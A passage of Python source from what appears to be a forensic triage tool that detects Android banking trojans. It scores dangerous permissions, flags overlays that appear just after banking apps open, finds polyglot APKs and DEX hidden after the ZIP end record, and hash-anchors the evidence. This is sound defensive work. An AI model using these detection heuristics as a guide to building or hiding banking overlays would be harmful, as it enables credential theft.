# Sub-engine 4: Sideloaded Android trojan triage                              #
# --------------------------------------------------------------------------- #

PERMISSION_WEIGHTS = {
    "BIND_ACCESSIBILITY_SERVICE": 0.95,
    "BIND_NOTIFICATION_LISTENER_SERVICE": 0.90,
    "SYSTEM_ALERT_WINDOW": 0.85,
    "RECEIVE_SMS": 0.60,
    "READ_SMS": 0.60,
    "REQUEST_INSTALL_PACKAGES": 0.55,
    "READ_CALL_LOG": 0.50,
    "RECORD_AUDIO": 0.45,
    "RECEIVE_BOOT_COMPLETED": 0.30,
}
TRUSTED_INSTALLERS = {"com.android.vending", "com.sec.android.app.samsungapps", "com.huawei.appmarket",
                      "com.xiaomi.mipicks", "com.oppo.market", "com.heytap.market", "com.amazon.venezia"}
BANKING_PACKAGES = {"com.sbi.lotusintouch", "com.sbi.sbifreedomplus", "com.snapwork.hdfc", "com.csam.icici.bank.imobile",
                    "com.axis.mobile", "com.msf.kbank.mobile", "net.one97.paytm", "com.phonepe.app",
                    "com.google.android.apps.nbu.paisa.user", "in.org.npci.upiapp", "com.bankofbaroda.mconnect",
                    "com.infrasofttech.indianbank", "com.pnb.pnbone", "in.amazon.mshop.android.shopping"}
_LAUNCHERS = ("launcher", "com.android.settings", ".home", "trebuchet", "nexuslauncher")
SYSTEM_AUTH_SURFACES = {
    "com.android.systemui", "com.google.android.gms", "com.android.permissioncontroller",
    "com.google.android.permissioncontroller", "com.samsung.android.biometrics.app.setting",
    "com.miui.securitycenter", "com.coloros.safecenter", "com.android.keychain", "com.android.credentialmanager",
    "com.google.android.inputmethod.latin", "com.samsung.android.honeyboard", "com.android.providers.media.module",
    "com.android.documentsui", "com.google.android.documentsui", "com.android.packageinstaller",
    "com.google.android.packageinstaller"}
SYSTEM_AUTH_PREFIXES = ("com.android.inputmethod", "com.google.android.gms.", "com.samsung.android.biometrics")
_DEX_MAGIC = re.compile(rb"dex\n0[3-4][0-9]\x00")


class AndroidTrojanTriageEngine:
    """Rooted dump, ADB non-root and bugreport ingestion; capability, overlay and polyglot analysis."""

    OVERLAY_WINDOW_MS = 500

    # ----- Mode 2: adb shell dumpsys package ------------------------------- #

    @staticmethod
    def parse_dumpsys_package(data: bytes) -> Dict[str, Dict[str, Any]]:
        pkgs: Dict[str, Dict[str, Any]] = {}
        cur = None
        resolver = re.compile(r"\s([a-zA-Z][\w.]+)/[\w.$]+.*?permission\s+(android\.permission\.\w+)")
        for off, length, line in iter_lines(data):
            m = re.match(r"^\s*Package \[([\w.]+)\]", line)
            if m:
                cur = pkgs.setdefault(m.group(1), {"package": m.group(1), "permissions": set(), "installer": None,
                                                   "code_path": None, "first_install": None,
                                                   "byte_offset": off, "end_offset": off + length})
                continue
            rm = resolver.search(line)
            if rm:  # Service Resolver Table entry: service guarded by a BIND_* permission
                p = pkgs.setdefault(rm.group(1), {"package": rm.group(1), "permissions": set(), "installer": None,
                                                  "code_path": None, "first_install": None,
                                                  "byte_offset": off, "end_offset": off + length})
                p["permissions"].add(rm.group(2).rsplit(".", 1)[-1])
                continue
            if cur is None:
                continue
            if line and not line.startswith(" "):
                cur = None
                continue
            cur["end_offset"] = off + length
            s = line.strip()
            if s.startswith("installerPackageName="):
                v = s.split("=", 1)[1].strip()
                cur["installer"] = None if v in ("null", "") else v
            elif s.startswith("codePath="):
                cur["code_path"] = s.split("=", 1)[1].strip()
            elif s.startswith("firstInstallTime="):
                cur["first_install"] = s.split("=", 1)[1].strip()
            for pm in re.finditer(r"android\.permission\.([A-Z_]+)", s):
                if "granted=false" not in s:
                    cur["permissions"].add(pm.group(1))
        return pkgs

    # ----- Mode 1: rooted /data/system/packages.xml ------------------------ #

    _XML_TAG_STOP = re.compile(rb"[\"'>]")

    @classmethod
    def _xml_tag_end(cls, data: bytes, start: int) -> int:
        """End (exclusive) of the tag opening at start; '>' inside a quoted attribute value does not end it."""
        pos = start
        while True:
            m = cls._XML_TAG_STOP.search(data, pos)
            if m is None:
                return len(data)
            if m.group(0) == b">":
                return m.end()
            close = data.find(m.group(0), m.end())
            if close < 0:
                return len(data)
            pos = close + 1

    @classmethod
    def parse_packages_xml(cls, data: bytes) -> Dict[str, Dict[str, Any]]:
        """
        Rooted /data/system/packages.xml (text form). Each package keeps the byte extent of its own
        element, taken from the same expat parse that reads its permissions (CurrentByteIndex), so a
        <package> inside a comment or CDATA cannot take the anchor and no regex rescans the file.
        """
        if data[:4] == b"ABX\x00":
            raise ValueError("packages.xml is Android Binary XML (ABX); convert with `abx2xml` first")
        if data[:2] in (b"\xff\xfe", b"\xfe\xff"):
            raise ValueError("packages.xml is UTF-16; convert to UTF-8 so byte anchors stay exact")
        parser = xml.parsers.expat.ParserCreate()
        stack: List[Optional[Dict[str, Any]]] = []
        pkgs: Dict[str, Dict[str, Any]] = {}

        def start(tag: str, attrs: Dict[str, str]) -> None:
            if tag == "package":
                begin = parser.CurrentByteIndex
                stack.append({"name": attrs.get("name"), "permissions": set(), "installer": attrs.get("installer"),
                              "code_path": attrs.get("codePath"), "first_install": attrs.get("it"),
                              "begin": begin, "tag_end": cls._xml_tag_end(data, begin)})
                return
            if tag == "item" and attrs.get("granted", "true") != "false":
                for open_pkg in stack:   # same as Element.iter("item") under every enclosing <package>
                    if open_pkg is not None:
                        open_pkg["permissions"].add(attrs.get("name", "").rsplit(".", 1)[-1])
            stack.append(None)

        def end(tag: str) -> None:
            p = stack.pop()
            if p is None or not p["name"]:
                return
            if data[p["tag_end"] - 2:p["tag_end"]] == b"/>":
                stop = p["tag_end"]                       # <package ... />
            else:
                close = parser.CurrentByteIndex           # start of </package>
                gt = data.find(b">", close)
                stop = gt + 1 if gt >= 0 else len(data)
            pkgs[p["name"]] = {"package": p["name"], "permissions": p["permissions"], "installer": p["installer"],
                               "code_path": p["code_path"], "first_install": p["first_install"],
                               "byte_offset": p["begin"], "end_offset": stop}

        parser.StartElementHandler = start
        parser.EndElementHandler = end
        parser.Parse(data, True)
        return pkgs

    @staticmethod
    def parse_secure_settings(data: bytes) -> Dict[str, List[str]]:
        """`settings get secure ...` output (key=value lines) or settings_secure.xml."""
        out = {"enabled_accessibility_services": [], "enabled_notification_listeners": []}
        if data[:2] == b"\xff\xfe":   # Windows PowerShell 5.1 '>' redirect of `adb shell settings ...`
            text = data[2:].decode("utf-16-le", "replace")
        else:
            text = data.decode("utf-8-sig", "replace")
        for key in out:
            vals = re.findall(rf'name="{key}"\s+value="([^"]*)"', text) + re.findall(rf"^{key}=(.*)$", text, re.M)
            for v in vals:
                out[key].extend(c.split("/")[0] for c in v.strip().split(":") if "/" in c)
        return out

    _FG_TYPES = {"MOVE_TO_FOREGROUND", "ACTIVITY_RESUMED", "1"}
    _BG_TYPES = {"MOVE_TO_BACKGROUND", "ACTIVITY_PAUSED", "ACTIVITY_STOPPED", "2", "23"}

    @classmethod
    def parse_usagestats(cls, data: bytes) -> List[Dict[str, Any]]:
        """
        dumpsys usagestats event lines: time="..." type=<event> package=... [class=...]. Foreground and
        background events are kept (kind FG/BG); lines with unparseable times are skipped.
        """
        evs = []
        rx = re.compile(r'time="([^"]+)"\s+type=(\w+)\s+package=([\w.]+)(?:\s+class=(\S+))?')
        for off, length, line in iter_lines(data):
            m = rx.search(line)
            if not m or m.group(2) not in cls._FG_TYPES | cls._BG_TYPES:
                continue
            try:
                t = parse_timestamp(m.group(1))
            except (ValueError, TypeError, OverflowError):
                continue
            evs.append({"t": t, "time": m.group(1), "package": m.group(3), "class": m.group(4),
                        "kind": "FG" if m.group(2) in cls._FG_TYPES else "BG",
                        "byte_offset": off, "length": length})
        evs.sort(key=lambda e: (e["t"], e["byte_offset"]))
        return evs

    # ----- Mode 3: bugreport ----------------------------------------------- #

    @staticmethod
    def split_bugreport(data: bytes) -> Tuple[bytes, Dict[str, Tuple[int, int]]]:
        """
        Locate 'DUMP OF SERVICE package/usagestats/settings' sections. Returns (text bytes, {name: (start, end)}).
        Zipped bugreports return the inner bugreport*.txt bytes (offsets are then relative to that member).
        """
        if data[:4] == b"PK\x03\x04":
            with zipfile.ZipFile(io.BytesIO(data)) as zf:
                name = next(n for n in zf.namelist() if re.search(r"bugreport.*\.txt$", n))
                data = zf.read(name)
        heads = [(m.start(), m.group(1).decode()) for m in
                 re.finditer(rb"^-+\s*DUMP OF SERVICE (\w+):?.*$", data, re.M)]
        sections = {}
        for i, (start, name) in enumerate(heads):
            end = heads[i + 1][0] if i + 1 < len(heads) else len(data)
            sections[name] = (start, end)
        return data, sections

    # ----- analysis -------------------------------------------------------- #

    def score_packages(self, pkgs: Dict[str, Dict[str, Any]],
                       secure: Optional[Dict[str, List[str]]] = None) -> List[Dict[str, Any]]:
        secure = secure or {}
        acc_on = set(secure.get("enabled_accessibility_services", []))
        nl_on = set(secure.get("enabled_notification_listeners", []))
        out = []
        for name, p in sorted(pkgs.items()):
            if (p.get("code_path") or "").startswith(("/system", "/product", "/vendor", "/apex")):
                continue
            dangerous = sorted(x for x in p["permissions"] if x in PERMISSION_WEIGHTS)
            if not dangerous:
                continue
            sideloaded = p.get("installer") not in TRUSTED_INSTALLERS
            score = noisy_or(PERMISSION_WEIGHTS[x] for x in dangerous)
            if not sideloaded:
                score *= 0.5
            enabled = [s for s, on in (("ACCESSIBILITY_ENABLED", name in acc_on),
                                       ("NOTIFICATION_LISTENER_ENABLED", name in nl_on)) if on]
            if enabled:
                score = noisy_or([score, 0.5])
            out.append({"package": name, "installer": p.get("installer"), "sideloaded": sideloaded,
                        "dangerous_capabilities": dangerous, "enabled_in_secure_settings": enabled,
                        "first_install": p.get("first_install"), "code_path": p.get("code_path"),
                        "threat_score": _r(score), "byte_offset": p["byte_offset"],
                        "length": max(1, p["end_offset"] - p["byte_offset"])})
        return out

    def detect_overlay_attacks(self, events: Sequence[Dict[str, Any]],
                               suspicious: Optional[Iterable[str]] = None,
                               known_benign: Optional[Iterable[str]] = None) -> List[Dict[str, Any]]:
        """
        A package coming to the foreground < 500 ms after a banking app is an overlay lead only if it
        is not a system authentication/permission surface, is not a service/receiver, and the user
        did not leave for the launcher in between. Packages flagged for overlay/accessibility
        capabilities score 0.93; packages absent from the package dump score 0.55; packages known to
        hold no dangerous capability are not reported.
        """
        suspicious = set(suspicious or [])
        benign = set(known_benign or [])
        fg = [e for e in events if e.get("kind", "FG") == "FG"]
        hits = []
        for i, ev in enumerate(fg):
            if ev["package"] not in BANKING_PACKAGES:
                continue
            for nxt in fg[i + 1:]:
                dt_ms = (nxt["t"] - ev["t"]) * 1000.0
                if dt_ms >= self.OVERLAY_WINDOW_MS:
                    break
                pkg = nxt["package"]
                if pkg == ev["package"] or pkg in BANKING_PACKAGES:
                    continue
                if any(x in pkg for x in _LAUNCHERS):
                    break  # user went home: not a hijack of this banking session
                if pkg in SYSTEM_AUTH_SURFACES or pkg.startswith(SYSTEM_AUTH_PREFIXES):
                    continue
                if (nxt.get("class") or "").rsplit(".", 1)[-1].endswith(("Service", "Receiver", "Provider")):
                    continue
                if pkg in suspicious:
                    score = 0.93
                elif pkg in benign:
                    continue
                else:
                    score = 0.55
                hits.append({"banking_package": ev["package"], "overlay_package": pkg, "delta_ms": _r(dt_ms, 1),
                             "banking_event_time": ev["time"], "overlay_event_time": nxt["time"],
                             "overlay_package_flagged": pkg in suspicious, "threat_score": score,
                             "byte_offset": nxt["byte_offset"], "length": nxt["length"],
                             "banking_event_offset": ev["byte_offset"], "banking_event_length": ev["length"]})
                break
        return hits

    HEAD_SCAN = 4 * 1024 * 1024
    TAIL_SCAN = 4 * 1024 * 1024

    @classmethod
    def analyze_apk_bytes(cls, data: bytes) -> Dict[str, Any]:
        """In-memory convenience wrapper around analyze_apk_source."""
        return cls.analyze_apk_source(lambda off, n: data[off:off + n], len(data))

    @classmethod
    def analyze_apk_file(cls, path: str, base_offset: int = 0, length: Optional[int] = None) -> Dict[str, Any]:
        """Analyse an APK on disk (or an extent of an image) reading only the head and tail windows."""
        size = os.path.getsize(path) - base_offset if length is None else length
        with open(path, "rb") as f:
            def read_at(off: int, n: int) -> bytes:
                f.seek(base_offset + off)
                return f.read(n)
            return cls.analyze_apk_source(read_at, size)

    @classmethod
    def _rfind_stream(cls, read_at: Any, size: int, needle: bytes, stop: int = 0) -> int:
        """Last occurrence of needle in [stop, size), scanning backwards one bounded chunk at a time."""
        end = size
        while end > stop:
            start = max(stop, end - cls.TAIL_SCAN)
            chunk = read_at(start, min(size, end + len(needle) - 1) - start)
            i = chunk.rfind(needle)
            if i >= 0:
                return start + i
            end = start
        return -1

    @classmethod
    def _find_stream(cls, read_at: Any, start: int, size: int, pattern: Any) -> Optional[Tuple[int, bytes]]:
        """First regex match in [start, size), forward in bounded chunks with overlap."""
        pos, overlap = start, 16
        while pos < size:
            chunk = read_at(pos, min(cls.TAIL_SCAN + overlap, size - pos))
            m = pattern.search(chunk)
            if m:
                return pos + m.start(), m.group(0)
            pos += cls.TAIL_SCAN
        return None

    @staticmethod
    def _archive_data_start(read_at: Any, size: int, eocd: int) -> Optional[Tuple[int, int]]:
        """
        (base, entry) from the end record, or None if it cannot be trusted: base = cd_start - cd_offset
        (where the archive's own offsets count from; > 0 means data was prepended without adjusting
        them) and entry = the local header of the first central-directory entry.
        """
        if eocd < 0 or eocd + 22 > size:
            return None
        rec = read_at(eocd, 22)
        if len(rec) < 22:
            return None
        cd_size, cd_offset = struct.unpack_from("<II", rec, 12)
        if 0xFFFFFFFF in (cd_size, cd_offset) or cd_size == 0:
            return None   # ZIP64 or empty archive: keep the head search
        cd_start = eocd - cd_size
        base = cd_start - cd_offset
        if cd_start < 0 or base < 0:
            return None
        cdh = read_at(cd_start, 46)
        if len(cdh) < 46 or cdh[:4] != b"PK\x01\x02":
            return None
        start = base + struct.unpack_from("<I", cdh, 42)[0]
        if start < 0 or start + 4 > size or read_at(start, 4) != b"PK\x03\x04":
            return None
        return base, start

    @classmethod
    def analyze_apk_source(cls, read_at: Any, size: int) -> Dict[str, Any]:
        """
        Polyglot headers (JPEG/PNG/GIF/PDF before the ZIP) and DEX hidden after the ZIP end record.
        Memory is bounded whatever the file size: the head check reads HEAD_SCAN bytes, and the EOCD
        and trailer-slack searches stream in TAIL_SCAN chunks.
        """
        findings = []
        head = read_at(0, min(size, cls.HEAD_SCAN))
        first_lfh = head.find(b"PK\x03\x04")
        prefix = {b"\xff\xd8\xff": "JPEG", b"\x89PNG": "PNG", b"GIF8": "GIF", b"%PDF": "PDF"}
        magic = next((v for k, v in prefix.items() if head.startswith(k)), None)
        eocd = cls._rfind_stream(read_at, size, b"PK\x05\x06")
        # Where the archive really starts, from its own end record (what Android's installer reads):
        # central directory at eocd - cd_size, entry offsets relative to cd_start - cd_offset, first
        # entry at that base + its local-header offset. This finds a prefix of any length (a 5 MB
        # JPEG hides the first local header from a HEAD_SCAN search) and an appended second ZIP.
        structural = cls._archive_data_start(read_at, size, eocd)
        if structural is not None:
            base, entry = structural
            if base > 0:     # offsets count from 'base': everything before it was prepended / concatenated
                first_lfh = base if read_at(base, 4) == b"PK\x03\x04" else entry
            elif first_lfh < 0:   # absolute offsets and a prefix longer than HEAD_SCAN
                first_lfh = entry
            # base == 0 with a header found at the head: keep it, so a central directory listed in a
            # different order from the local headers is not mistaken for prepended data
        if first_lfh > 0:
            earlier_eocd = cls._rfind_stream(read_at, first_lfh, b"PK\x05\x06")
            if earlier_eocd >= 0 and not magic:
                findings.append({"finding": "CONCATENATED_ZIP", "byte_offset": 0, "length": first_lfh,
                                 "earlier_end_record_offset": earlier_eocd, "weight": 0.85})
            else:
                findings.append({"finding": f"{magic}_ZIP_POLYGLOT" if magic else "PREPENDED_DATA_BEFORE_ZIP",
                                 "byte_offset": 0, "length": first_lfh, "weight": 0.85 if magic else 0.60})
        zip_end = None
        if eocd >= 0 and eocd + 22 <= size:
            rec = read_at(eocd, 22)
            comment_len = struct.unpack_from("<H", rec, 20)[0]
            zip_end = min(size, eocd + 22 + comment_len)
            comment = read_at(eocd + 22, zip_end - eocd - 22)
            if _DEX_MAGIC.search(comment):
                findings.append({"finding": "DEX_IN_ZIP_COMMENT", "byte_offset": eocd + 22,
                                 "length": len(comment), "weight": 0.85})
            if zip_end < size:
                dm = cls._find_stream(read_at, zip_end, size, _DEX_MAGIC)
                start = dm[0] if dm else zip_end
                findings.append({"finding": "HIDDEN_DEX_IN_TRAILER_SLACK" if dm else "TRAILER_SLACK_DATA",
                                 "byte_offset": start, "length": size - start,
                                 "dex_version": dm[1][4:7].decode() if dm else None,
                                 "trailer_bytes": size - zip_end, "weight": 0.90 if dm else 0.40})
        score = noisy_or(f["weight"] for f in findings)
        return {"is_zip": first_lfh >= 0 and eocd >= 0, "first_local_header_offset": first_lfh,
                "zip_end_offset": zip_end, "findings": findings, "threat_score": _r(score)}


# --------------------------------------------------------------------------- #
# Master orchestrator                                                         #
# --------------------------------------------------------------------------- #

ARTIFACT_KINDS = {
    "process_events_jsonl", "rppg_trace", "image_pgm", "whatsapp_log", "registry_export", "anydesk_trace",
    "upi_csv", "chain_csv", "chat_transcript", "dumpsys_package", "packages_xml", "secure_settings",
    "usagestats", "bugreport", "apk",
}


class SutraNeuralTriageOrchestrator:
    """
    Register artifacts (in-memory bytes, a file, or an extent of a Sector A image), run the engines,
    anchor every lead to bytes, and emit triage_manifest.json.
    """

    def __init__(self, case_id: str = "FIR-042/2026-CYBER", output_dir: Optional[str] = None,
                 lead_threshold: float = LEAD_THRESHOLD, device_owner: Optional[str] = None,
                 usdt_inr_rate: float = 84.0, log_utc_offset_minutes: int = 330,
                 onnx_model_path: Optional[str] = None):
        self.case_id = case_id
        self.output_dir = output_dir or os.getcwd()
        self.lead_threshold = lead_threshold
        self.device_owner = device_owner
        self.log_utc_offset_minutes = log_utc_offset_minutes
        self.log_engine = LogTriageEngine()
        self.media_engine = DeepfakeTriageEngine(onnx_model_path)
        self.fin_engine = FinancialMuleDetector(usdt_inr_rate)
        self.apk_engine = AndroidTrojanTriageEngine()
        self.artifacts: Dict[str, Dict[str, Any]] = {}
        self.sector_a: Optional[Dict[str, Any]] = None
        self._sector_a_bad: Tuple[List[int], int, Optional[str]] = ([], 4096, None)
        self._cache: Dict[str, bytes] = {}

    # ----- inputs ---------------------------------------------------------- #

    VERIFY_BOUND_IMAGE = True   # re-hash the bound evidence image once per run and compare with Sector A

    def bind_sector_a_manifest(self, manifest: Any) -> Dict[str, Any]:
        """
        Bind triage to a Sector A evidence_manifest.json (dict or path). The manifest's canonical digest
        is re-computed with Sector A's own canonical JSON (as Sector C does), so an edited manifest is
        refused instead of being copied into sector_a_binding. run() later re-hashes the registered
        image against sha256_linear_primary (sector_a_binding.image_digest).
        """
        if isinstance(manifest, str):
            with open(manifest, "r", encoding="utf-8") as f:
                manifest = json.load(f)
        if not isinstance(manifest, dict):
            raise ValueError("Sector A manifest is not a JSON object")
        digest_status = "UNVERIFIED (sector_a_vault.py not found beside this file)"
        canon = getattr(_sector_a, "_canonical_json", None)
        if canon is not None:
            body = {k: v for k, v in manifest.items() if k != "manifest_canonical_sha256"}
            if hashlib.sha256(canon(body)).hexdigest() != manifest.get("manifest_canonical_sha256"):
                raise ValueError("evidence_manifest.json canonical digest mismatch (manifest altered)")
            digest_status = "VERIFIED"
        h = manifest.get("cryptographic_hashes", {})
        media = manifest.get("evidence_media", {})
        bsm = manifest.get("bad_sector_manifest") or {}
        try:
            self._sector_a_bad = (sorted({int(b) for b in bsm.get("bad_sectors") or []}),
                                  int(bsm.get("sector_size_bytes") or 4096), h.get("sha256_piecewise_valid_extent"))
        except (TypeError, ValueError):
            self._sector_a_bad = ([], 4096, None)
        self.sector_a = {
            "vault_version": manifest.get("version"),
            "evidence_id": manifest.get("evidence_id"),
            "case_reference": manifest.get("case_reference"),
            "evidence_filename": media.get("filename") or manifest.get("evidence_filename"),
            "evidence_size_bytes": media.get("size_bytes") or manifest.get("file_size_bytes"),
            "sha256_linear_primary": h.get("sha256_linear_primary") or h.get("sha256_primary"),
            "master_case_root_v3": h.get("master_case_root_v3"),
            "admissibility_status": (manifest.get("admissibility") or {}).get("status"),
            "manifest_canonical_sha256": manifest.get("manifest_canonical_sha256"),
            "manifest_digest": digest_status,
            "image_digest": "UNVERIFIED (run() not executed yet)",
        }
        if self.sector_a["case_reference"] and self.sector_a["case_reference"] != self.case_id:
            raise ValueError(f"Sector A manifest is for {self.sector_a['case_reference']}, not {self.case_id}")
        return self.sector_a

    def add_artifact(self, artifact_id: str, kind: str, source_type: str, data: Optional[bytes] = None,
                     path: Optional[str] = None, base_offset: int = 0, length: Optional[int] = None,
                     **meta: Any) -> None:
        """
        data: bytes held in memory. path: a file, or (with base_offset/length) an extent of a vaulted image;
        anchors then use absolute offsets in that file.
        """
        if kind not in ARTIFACT_KINDS:
            raise ValueError(f"unknown artifact kind {kind!r}")
        if (data is None) == (path is None):
            raise ValueError("give exactly one of data or path")
        if path is not None:
            size = os.path.getsize(path)
            if length is None:
                length = size - base_offset
            if (not isinstance(base_offset, int) or not isinstance(length, int) or isinstance(base_offset, bool)
                    or isinstance(length, bool) or base_offset < 0 or length < 0 or base_offset + length > size):
                raise ValueError(f"extent {base_offset}+{length} of artifact {artifact_id!r} is outside "
                                 f"{os.path.basename(path)} ({size} bytes)")
        self.artifacts[artifact_id] = {"kind": kind, "source_type": source_type, "data": data, "path": path,
                                       "base": base_offset if path else 0,
                                       "length": len(data) if data is not None else length, "meta": meta}

    # Largest artifact parsed whole in RAM. Parsing amplifies text 5-8x (decoded lines, event dicts), so
    # the cap keeps one artifact well inside the 422 MB laptop budget of the whole pipeline; a larger
    # log is reported in artifact_errors and should be registered as smaller extents.
    MAX_INMEMORY_BYTES = 48 * 1024 * 1024
    # Kinds whose parse keeps little beyond the raw bytes (a bugreport is regex-split and only three
    # sections are parsed) may be larger; real bugreport .txt files are often 30-100 MB.
    MAX_INMEMORY_BY_KIND = {"bugreport": 128 * 1024 * 1024}
    HASH_CHUNK = 4 * 1024 * 1024

    def _read_range(self, art: Dict[str, Any], off: int, length: int) -> bytes:
        if length <= 0 or off < 0:
            return b""
        if art["data"] is not None:
            return art["data"][off:off + length]
        with open(art["path"], "rb") as f:
            f.seek(art["base"] + off)
            return f.read(length)

    def _load(self, aid: str) -> bytes:
        """
        Whole-artifact bytes for parsers that need them, size-capped. Only the artifact being parsed is
        cached (several large artifacts never accumulate), and a short read (file truncated after
        registration) is an error, never a silently shorter parse.
        """
        if aid not in self._cache:
            art = self.artifacts[aid]
            cap = max(self.MAX_INMEMORY_BYTES, self.MAX_INMEMORY_BY_KIND.get(art["kind"], 0))
            if art["length"] > cap:
                raise MemoryError(f"artifact is {art['length']} bytes; parse limit is {cap}. "
                                  "Register the relevant extent instead of the whole image.")
            self._cache = {}
            data = self._read_range(art, 0, art["length"])
            if len(data) != art["length"]:
                raise ValueError(f"TRUNCATED: expected {art['length']} bytes, read {len(data)}")
            self._cache = {aid: data}
        return self._cache[aid]

    def _artifact_sha256(self, art: Dict[str, Any]) -> str:
        """SHA-256 of the registered extent; raises OSError if unreadable and ValueError on a short read."""
        h = hashlib.sha256()
        if art["data"] is not None:
            h.update(art["data"])
            return h.hexdigest()
        with open(art["path"], "rb") as f:
            f.seek(art["base"])
            left = art["length"]
            while left > 0:
                chunk = f.read(min(self.HASH_CHUNK, left))
                if not chunk:
                    raise ValueError(f"TRUNCATED: expected {art['length']} bytes, read {art['length'] - left}")
                h.update(chunk)
                left -= len(chunk)
        return h.hexdigest()

    def _image_digests(self, path: str) -> Tuple[str, Optional[str]]:
        """(linear SHA-256, SHA-256 of the bytes outside Sector A's bad sectors) of a file, in one pass."""
        bad, ss, _ = self._sector_a_bad
        lin, valid = hashlib.sha256(), hashlib.sha256()
        bad_set = set(bad)
        pos = 0
        with open(path, "rb") as f:
            while True:
                chunk = f.read(self.HASH_CHUNK)
                if not chunk:
                    break
                lin.update(chunk)
                if bad_set:
                    mv = memoryview(chunk)
                    i = 0
                    while i < len(chunk):
                        sec = (pos + i) // ss
                        j = min(len(chunk), (sec + 1) * ss - pos)
                        if sec not in bad_set:
                            valid.update(mv[i:j])
                        i = j
                pos += len(chunk)
        return lin.hexdigest(), (valid.hexdigest() if bad_set else None)

    def _verify_bound_image(self, errors: List[Dict[str, Any]]) -> str:
        """
        Re-hash each registered file that is the Sector A evidence (same file name or size) and compare
        with sha256_linear_primary (or, when Sector A recorded bad sectors, the valid-extent digest).
        Returns VERIFIED / VERIFIED_VALID_EXTENT / MISMATCH / UNREADABLE / UNVERIFIED (...); a mismatch
        is also an INTEGRITY_FAILURE artifact error and an unreadable image an UNREADABLE one.
        """
        a = self.sector_a
        if not a or not a.get("sha256_linear_primary"):
            return "UNVERIFIED (no Sector A digest bound)"
        if not self.VERIFY_BOUND_IMAGE:
            return "UNVERIFIED (verification disabled)"
        want_name = os.path.basename(str(a.get("evidence_filename") or "")).lower()
        want_size = a.get("evidence_size_bytes")
        files: Dict[str, List[str]] = defaultdict(list)
        for aid, art in sorted(self.artifacts.items()):
            if art["path"] is None:
                continue
            try:
                size = os.path.getsize(art["path"])
            except OSError:
                size = None
            if (want_name and os.path.basename(art["path"]).lower() == want_name) or \
                    (want_size is not None and size == want_size):
                files[os.path.realpath(art["path"])].append(aid)
        if not files:
            return "UNVERIFIED (Sector A image not registered as a file)"
        statuses = []
        for real, aids in sorted(files.items()):
            try:
                linear, valid = self._image_digests(real)
            except OSError as exc:   # moved, deleted or locked (Windows sharing violation): not verified
                errors.append({"artifact_id": aids[0],
                               "error": f"UNREADABLE: bound image could not be re-hashed against Sector A: "
                                        f"{type(exc).__name__}: {exc}"[:300]})
                statuses.append("UNREADABLE")
                continue
            if linear == a["sha256_linear_primary"]:
                statuses.append("VERIFIED")
            elif valid is not None and valid == self._sector_a_bad[2]:
                statuses.append("VERIFIED_VALID_EXTENT")
            else:
                statuses.append("MISMATCH")
                errors.append({"artifact_id": aids[0],
                               "error": f"INTEGRITY_FAILURE: {os.path.basename(real)} SHA-256 {linear[:16]}... does "
                                        f"not match Sector A sha256_linear_primary {str(a['sha256_linear_primary'])[:16]}... "
                                        f"(artifacts {', '.join(aids)})"[:300]})
        for worst in ("MISMATCH", "UNREADABLE"):
            if worst in statuses:
                return worst
        return "VERIFIED" if all(st == "VERIFIED" for st in statuses) else "VERIFIED_VALID_EXTENT"

    # ----- anchoring ------------------------------------------------------- #

    def _anchor(self, ref: Dict[str, Any]) -> Dict[str, Any]:
        """Hash exactly the referenced range, re-read from the artifact (never from a parser's copy)."""
        art = self.artifacts[ref["artifact_id"]]
        off, length = ref["byte_offset"], ref["length"]
        if length <= 0 or off < 0 or off + length > art["length"]:
            raise ValueError(f"anchor outside artifact {ref['artifact_id']}: {off}+{length}")
        h = hashlib.sha256()
        pos = off
        while pos < off + length:  # bounded memory even for multi-GB ranges
            chunk = self._read_range(art, pos, min(self.HASH_CHUNK, off + length - pos))
            if not chunk:
                raise ValueError(f"short read in artifact {ref['artifact_id']} at {pos}")
            h.update(chunk)
            pos += len(chunk)
        anchor = {"source_type": art["source_type"], "artifact_id": ref["artifact_id"],
                  "byte_offset": art["base"] + off, "length": length, "sha256": h.hexdigest()}
        if art["path"]:
            anchor["file_path"] = art["meta"].get("display_path") or art["path"]
            anchor["offset_basis"] = "ABSOLUTE_IN_FILE" if art["base"] or art["meta"].get("extent") else "FILE"
        else:
            anchor["offset_basis"] = "ARTIFACT"
        anchor.update({k: v for k, v in art["meta"].items() if k not in ("display_path", "extent", "qp")})
        anchor.update({k: v for k, v in ref.items() if k not in ("artifact_id", "byte_offset", "length")})
        return anchor

    @staticmethod
    def verify_anchor(anchor: Dict[str, Any], source: Any) -> bool:
        """
        Re-hash an anchor from bytes or a file path (absolute offsets). Independent of the engines.
        Never raises: a malformed anchor (non-integer, negative or zero-length range, sha256 that is not
        64 lowercase hex digits), a range past the end of the source, or an unreadable file is False.
        """
        if not isinstance(anchor, dict):
            return False
        off, length, digest = anchor.get("byte_offset"), anchor.get("length"), anchor.get("sha256")
        if (not isinstance(off, int) or isinstance(off, bool) or not isinstance(length, int)
                or isinstance(length, bool) or off < 0 or length <= 0
                or not isinstance(digest, str) or not re.fullmatch(r"[0-9a-f]{64}", digest)):
            return False
        if isinstance(source, (bytes, bytearray, memoryview)):
            chunk = bytes(source[off:off + length])
            return len(chunk) == length and _sha256_hex(chunk) == digest
        h, got = hashlib.sha256(), 0
        try:
            if off + length > os.path.getsize(source):
                return False
            with open(source, "rb") as f:
                f.seek(off)
                while got < length:
                    chunk = f.read(min(4 * 1024 * 1024, length - got))
                    if not chunk:
                        return False
                    h.update(chunk)
                    got += len(chunk)
        except (OSError, TypeError, ValueError):
            return False
        return h.hexdigest() == digest

    # ----- run ------------------------------------------------------------- #

    def run(self, triage_time_utc: Optional[str] = None, write: bool = True) -> Dict[str, Any]:
        """
        Run every engine over the registered artifacts. A malformed or oversized artifact is recorded in
        'artifact_errors' and skipped; it never aborts the run. Leads carry one primary anchor plus,
        where a lead rests on several records (smurfing rows, bridge legs, overlay event pairs), an
        anchor per record in lead_details, each in its own artifact.
        """
        self._cache: Dict[str, bytes] = {}
        raw: List[Dict[str, Any]] = []
        errors: List[Dict[str, Any]] = []
        by_kind: Dict[str, List[str]] = defaultdict(list)
        # A file moved, deleted, locked (Windows sharing violation) or truncated since registration is a
        # tripwire in artifact_errors, and the artifact is not parsed: never a traceback, never a parse of
        # fewer bytes than were registered.
        unavailable: Dict[str, str] = {}
        for aid, a in sorted(self.artifacts.items()):
            if a["path"] is None:
                continue
            try:
                size = os.path.getsize(a["path"])
            except OSError as exc:
                unavailable[aid] = "UNREADABLE"
                errors.append({"artifact_id": aid, "error": f"UNREADABLE: {type(exc).__name__}: {exc}"[:300]})
                continue
            if a["base"] + a["length"] > size:
